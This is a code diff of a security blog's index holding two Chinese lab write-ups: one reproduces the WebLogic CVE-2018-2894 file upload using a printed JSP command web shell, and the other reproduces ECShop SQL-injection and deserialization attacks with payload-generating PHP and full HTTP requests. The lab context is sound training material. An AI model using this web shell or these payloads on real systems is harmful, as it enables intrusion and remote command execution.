-<p>启动docker容器</p>
-<img src="https://images.gaifagafin.top/202311082306552.png" style="zoom: 80%;" />
+    <title>Weblogic 任意文件上传漏洞（CVE-2018-2894）</title>
+    <url>/2023/11/11/Weblogic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2894%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Weblogic 任意文件上传漏洞（CVE-2018-2894）</strong></p>
+<ol>
+<li>复现环境中的任意文件上传漏洞，截图证明</li>
+<li>上传WebShell（或反弹shell），并通过WebShell （或反弹shell）执行whoami命令，提供截图</li>
+</ol>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/weblogic/CVE-2018-2894</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器</p>
+<p>浏览器访问<code>Your-ip:7001/console</code>即可看到后台登录页面</p>
+<img src="https://images.gaifagafin.top/202311112128112.png" style="zoom:67%;" />
 
-<p>下面是ecshop2.X和3.X对应的端口映射</p>
-<img src="https://images.gaifagafin.top/202311082306615.png" style="zoom:67%;" />
+<p>执行<code>docker-compose logs | grep password</code>可查看管理员密码，管理员用户名为<code>weblogic</code>。</p>
+<img src="https://images.gaifagafin.top/202311112128042.png" style="zoom: 80%;" />
 
-<img src="https://images.gaifagafin.top/202311082306822.png" style="zoom:67%;" />
+<p>登录后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项：</p>
+<img src="https://images.gaifagafin.top/202311112128891.png" style="zoom:67%;" />
 
-<p>输入<code>localhost:5004</code>安装ecshop2.X</p>
-<img src="https://images.gaifagafin.top/202311082306528.png" style="zoom:67%;" />
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:7001/ws_utc/config.do</code></p>
+<p>设置Work Home Dir为</p>
+<p><code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code></p>
+<p>我将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p>
+<img src="https://images.gaifagafin.top/202311112128176.png" style="zoom:67%;" />
 
-<p>点击下一步</p>
-<img src="https://images.gaifagafin.top/202311082306521.png" style="zoom:67%;" />
+<p>然后点击安全 -&gt; 增加，然后上传webshell：</p>
+<p><img src="https://images.gaifagafin.top/202311112128248.png"></p>
+<p>这里用burpsuite转发包到repeater再转发，查看返回的数据包，其中有时间戳，如果之前上传了多个shell脚本，选择最下面的一个时间戳</p>
+<img src="https://images.gaifagafin.top/202311112128015.png" style="zoom:67%;" />
 
-<p>继续点击下一步</p>
-<img src="https://images.gaifagafin.top/202311082307573.png" style="zoom:67%;" />
+<p>然后访问使用另一个浏览器访问</p>
+<p><code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]?pwd=123&amp;cmd=ls</code></p>
+<p>即可执行ls命令查看当前目录：</p>
+<img src="https://images.gaifagafin.top/202311112128725.png" style="zoom:67%;" />
 
-<p>数据主机填<code>mysql</code>,其他随便填，点击立即安装</p>
-<img src="https://images.gaifagafin.top/202311082307278.png" style="zoom:67%;" />
+<h2 id="执行whoami命令"><a href="#执行whoami命令" class="headerlink" title="执行whoami命令"></a>执行whoami命令</h2><p>浏览器输入<code>http://192.168.52.130:7001/ws_utc/css/config/keystore/1699702415808_shell.jsp?pwd=123&amp;cmd=whoami</code></p>
+<p>得到whoami回显<code>oracle</code></p>
+<img src="https://images.gaifagafin.top/202311112128942.png" style="zoom:67%;" />
 
-<p>安装成功</p>
-<img src="https://images.gaifagafin.top/202311082307228.png" style="zoom:67%;" />
-
-<p>浏览器输入localhost:5004,出现上面的页面则成功安装</p>
-<p>接下来安装ecshop3.X，步骤跟安装2.X一样，只不过安装完成后的页面是</p>
-<img src="https://images.gaifagafin.top/202311082307551.png" style="zoom:67%;" />
-
-<p>实际上是安装成功了的</p>
-<img src="https://images.gaifagafin.top/202311082307299.png" style="zoom:67%;" />
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="ecshop2-X漏洞利用"><a href="#ecshop2-X漏洞利用" class="headerlink" title="ecshop2.X漏洞利用"></a>ecshop2.X漏洞利用</h3><p>漏洞利用参考:<a href="https://paper.seebug.org/691/">https://paper.seebug.org/691/</a></p>
-<p>根据官方文档的PHP脚本生成POC</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$shell</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;&#123;\$asd&#x27;];phpinfo\t();//&#125;xxx&quot;</span>);<br><span class="hljs-variable">$id</span> = <span class="hljs-string">&quot;-1&#x27; UNION/*&quot;</span>;<br><span class="hljs-variable">$arr</span> = [<br>    <span class="hljs-string">&quot;num&quot;</span> =&gt; <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&#x27;</span>, <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$id</span>), <span class="hljs-variable">$shell</span>),<br>    <span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id</span><br>];<br><br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><br><span class="hljs-variable">$hash3</span> = <span class="hljs-string">&#x27;45ea207d7a2b68c49582d2d22adf953a&#x27;</span>;<br><span class="hljs-variable">$hash2</span> = <span class="hljs-string">&#x27;554fcae493e564ee0dc75bdf2ebf94ca&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;POC for ECShop 2.x: \n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$hash2&#125;</span>ads|<span class="hljs-subst">&#123;$s&#125;</span><span class="hljs-subst">&#123;$hash2&#125;</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n\nPOC for ECShop 3.x: \n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$hash3&#125;</span>ads|<span class="hljs-subst">&#123;$s&#125;</span><span class="hljs-subst">&#123;$hash3&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure>
-
-<p>得到POC</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">POC <span class="hljs-keyword">for</span> ECShop <span class="hljs-number">2</span>.x: <span class="hljs-number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;num&quot;</span>;s:<span class="hljs-number">107</span>:<span class="hljs-string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="hljs-number">554</span>fcae493e564ee0dc75bdf2ebf94ca<br>POC <span class="hljs-keyword">for</span> ECShop <span class="hljs-number">3</span>.x: <span class="hljs-number">45</span>ea207d7a2b68c49582d2d22adf953aads|a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;num&quot;</span>;s:<span class="hljs-number">107</span>:<span class="hljs-string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="hljs-number">45</span>ea207d7a2b68c49582d2d22adf953a<br></code></pre></td></tr></table></figure>
-
-<p>利用burpsuite抓包将POC的内容添加到referer</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:5004<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ECS[visit_times]=2; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=b7c2c44019c15d14702c20f596ff07937ac45ba6<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure>
-
-<p>页面回显</p>
-<img src="https://images.gaifagafin.top/202311082307103.png" style="zoom:67%;" />
-
-<h3 id="ecshop3-X漏洞利用"><a href="#ecshop3-X漏洞利用" class="headerlink" title="ecshop3.X漏洞利用"></a>ecshop3.X漏洞利用</h3><p>利用burpsuite抓包将上面POC的内容添加到referer</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:5005<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ECS[visit_times]=3; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=b7c2c44019c15d14702c20f596ff07937ac45ba6<br><span class="hljs-attribute">referer</span><span class="hljs-punctuation">: </span>45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure>
-
-<p>页面回显</p>
-<img src="https://images.gaifagafin.top/202311082307207.png" style="zoom: 67%;" />
-
-<h3 id="ecshop4-x漏洞利用"><a href="#ecshop4-x漏洞利用" class="headerlink" title="ecshop4.x漏洞利用"></a>ecshop4.x漏洞利用</h3><p>漏洞环境搭建同前面一样</p>
-<p>参考文档:<a href="https://vulhub.org/#/environments/ecshop/collection_list-sqli/">https://vulhub.org/#/environments/ecshop/collection_list-sqli/</a></p>
-<p>要利用漏洞首先要注册为一个普通用户，信息随便填</p>
-<img src="https://images.gaifagafin.top/202311082307371.png" style="zoom:67%;" />
-
-<p>根据参考文档抓包，在包里添加字段</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|45ea207d7a2b68c49582d2d22adf953a<br></code></pre></td></tr></table></figure>
-
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=collection_list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:5003<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>45ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|45ea207d7a2b68c49582d2d22adf953a<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ECS[visit_times]=4; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=53ae5332f431fa0b2d246a06d90dbf70b68310ff; real_ipd=172.22.0.1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure>
-
-<p>回显界面如下，得到当前数据库用户</p>
-<img src="https://images.gaifagafin.top/202311082307656.png" style="zoom:80%;" />
+<p>这里贴出我使用的的木马</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;123&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -1561,45 +1536,70 @@
       </tags>
   </entry>
   <entry>
-    <title>Weblogic 任意文件上传漏洞（CVE-2018-2894）</title>
-    <url>/2023/11/11/Weblogic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2894%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Weblogic 任意文件上传漏洞（CVE-2018-2894）</strong></p>
-<ol>
-<li>复现环境中的任意文件上传漏洞，截图证明</li>
-<li>上传WebShell（或反弹shell），并通过WebShell （或反弹shell）执行whoami命令，提供截图</li>
-</ol>
-<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/weblogic/CVE-2018-2894</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器</p>
-<p>浏览器访问<code>Your-ip:7001/console</code>即可看到后台登录页面</p>
-<img src="https://images.gaifagafin.top/202311112128112.png" style="zoom:67%;" />
+    <title>ecShop漏洞复现</title>
+    <url>/2023/11/08/ecShop%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="ecShop漏洞复现"><a href="#ecShop漏洞复现" class="headerlink" title="ecShop漏洞复现"></a>ecShop漏洞复现</h1><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>进入漏洞文件目录，输入<code>docker-compose up -d </code></p>
+<p>启动docker容器</p>
+<img src="https://images.gaifagafin.top/202311082306552.png" style="zoom: 80%;" />
 
-<p>执行<code>docker-compose logs | grep password</code>可查看管理员密码，管理员用户名为<code>weblogic</code>。</p>
-<img src="https://images.gaifagafin.top/202311112128042.png" style="zoom: 80%;" />
+<p>下面是ecshop2.X和3.X对应的端口映射</p>
+<img src="https://images.gaifagafin.top/202311082306615.png" style="zoom:67%;" />
 
-<p>登录后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项：</p>
-<img src="https://images.gaifagafin.top/202311112128891.png" style="zoom:67%;" />
+<img src="https://images.gaifagafin.top/202311082306822.png" style="zoom:67%;" />
 
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:7001/ws_utc/config.do</code></p>
-<p>设置Work Home Dir为</p>
-<p><code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code></p>
-<p>我将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p>
-<img src="https://images.gaifagafin.top/202311112128176.png" style="zoom:67%;" />
+<p>输入<code>localhost:5004</code>安装ecshop2.X</p>
+<img src="https://images.gaifagafin.top/202311082306528.png" style="zoom:67%;" />
 
-<p>然后点击安全 -&gt; 增加，然后上传webshell：</p>
-<p><img src="https://images.gaifagafin.top/202311112128248.png"></p>
-<p>这里用burpsuite转发包到repeater再转发，查看返回的数据包，其中有时间戳，如果之前上传了多个shell脚本，选择最下面的一个时间戳</p>
-<img src="https://images.gaifagafin.top/202311112128015.png" style="zoom:67%;" />
+<p>点击下一步</p>
+<img src="https://images.gaifagafin.top/202311082306521.png" style="zoom:67%;" />
 
-<p>然后访问使用另一个浏览器访问</p>
-<p><code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]?pwd=123&amp;cmd=ls</code></p>
-<p>即可执行ls命令查看当前目录：</p>
-<img src="https://images.gaifagafin.top/202311112128725.png" style="zoom:67%;" />
+<p>继续点击下一步</p>
+<img src="https://images.gaifagafin.top/202311082307573.png" style="zoom:67%;" />
 
-<h2 id="执行whoami命令"><a href="#执行whoami命令" class="headerlink" title="执行whoami命令"></a>执行whoami命令</h2><p>浏览器输入<code>http://192.168.52.130:7001/ws_utc/css/config/keystore/1699702415808_shell.jsp?pwd=123&amp;cmd=whoami</code></p>
-<p>得到whoami回显<code>oracle</code></p>
-<img src="https://images.gaifagafin.top/202311112128942.png" style="zoom:67%;" />
+<p>数据主机填<code>mysql</code>,其他随便填，点击立即安装</p>
+<img src="https://images.gaifagafin.top/202311082307278.png" style="zoom:67%;" />
 
-<p>这里贴出我使用的的木马</p>
-<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;123&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+<p>安装成功</p>
+<img src="https://images.gaifagafin.top/202311082307228.png" style="zoom:67%;" />
+
+<p>浏览器输入localhost:5004,出现上面的页面则成功安装</p>
+<p>接下来安装ecshop3.X，步骤跟安装2.X一样，只不过安装完成后的页面是</p>
+<img src="https://images.gaifagafin.top/202311082307551.png" style="zoom:67%;" />
+
+<p>实际上是安装成功了的</p>
+<img src="https://images.gaifagafin.top/202311082307299.png" style="zoom:67%;" />
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="ecshop2-X漏洞利用"><a href="#ecshop2-X漏洞利用" class="headerlink" title="ecshop2.X漏洞利用"></a>ecshop2.X漏洞利用</h3><p>漏洞利用参考:<a href="https://paper.seebug.org/691/">https://paper.seebug.org/691/</a></p>
+<p>根据官方文档的PHP脚本生成POC</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$shell</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;&#123;\$asd&#x27;];phpinfo\t();//&#125;xxx&quot;</span>);<br><span class="hljs-variable">$id</span> = <span class="hljs-string">&quot;-1&#x27; UNION/*&quot;</span>;<br><span class="hljs-variable">$arr</span> = [<br>    <span class="hljs-string">&quot;num&quot;</span> =&gt; <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&#x27;</span>, <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$id</span>), <span class="hljs-variable">$shell</span>),<br>    <span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id</span><br>];<br><br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><br><span class="hljs-variable">$hash3</span> = <span class="hljs-string">&#x27;45ea207d7a2b68c49582d2d22adf953a&#x27;</span>;<br><span class="hljs-variable">$hash2</span> = <span class="hljs-string">&#x27;554fcae493e564ee0dc75bdf2ebf94ca&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;POC for ECShop 2.x: \n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$hash2&#125;</span>ads|<span class="hljs-subst">&#123;$s&#125;</span><span class="hljs-subst">&#123;$hash2&#125;</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n\nPOC for ECShop 3.x: \n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$hash3&#125;</span>ads|<span class="hljs-subst">&#123;$s&#125;</span><span class="hljs-subst">&#123;$hash3&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>得到POC</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">POC <span class="hljs-keyword">for</span> ECShop <span class="hljs-number">2</span>.x: <span class="hljs-number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;num&quot;</span>;s:<span class="hljs-number">107</span>:<span class="hljs-string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="hljs-number">554</span>fcae493e564ee0dc75bdf2ebf94ca<br>POC <span class="hljs-keyword">for</span> ECShop <span class="hljs-number">3</span>.x: <span class="hljs-number">45</span>ea207d7a2b68c49582d2d22adf953aads|a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;num&quot;</span>;s:<span class="hljs-number">107</span>:<span class="hljs-string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="hljs-number">45</span>ea207d7a2b68c49582d2d22adf953a<br></code></pre></td></tr></table></figure>
+
+<p>利用burpsuite抓包将POC的内容添加到referer</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:5004<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ECS[visit_times]=2; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=b7c2c44019c15d14702c20f596ff07937ac45ba6<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure>
+
+<p>页面回显</p>
+<img src="https://images.gaifagafin.top/202311082307103.png" style="zoom:67%;" />
+
+<h3 id="ecshop3-X漏洞利用"><a href="#ecshop3-X漏洞利用" class="headerlink" title="ecshop3.X漏洞利用"></a>ecshop3.X漏洞利用</h3><p>利用burpsuite抓包将上面POC的内容添加到referer</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:5005<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ECS[visit_times]=3; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=b7c2c44019c15d14702c20f596ff07937ac45ba6<br><span class="hljs-attribute">referer</span><span class="hljs-punctuation">: 